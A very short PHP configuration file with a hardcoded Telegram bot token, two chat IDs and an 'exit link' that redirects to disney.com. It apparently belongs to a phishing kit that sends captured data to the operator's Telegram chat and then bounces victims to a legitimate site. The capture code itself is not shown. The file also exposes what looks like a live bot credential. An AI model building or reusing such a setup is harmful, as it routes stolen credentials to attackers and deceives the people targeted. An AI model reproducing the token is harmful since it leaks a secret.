<?php 



// telegram setup
$bot = "8249475116:AAGLHCGr-FUawOGgMyDQ5qdOFusMlhfTY5c";
$ids = ["-4921410726", "-4921410726"];



// exit link
$exit = "https://disney.com";


?>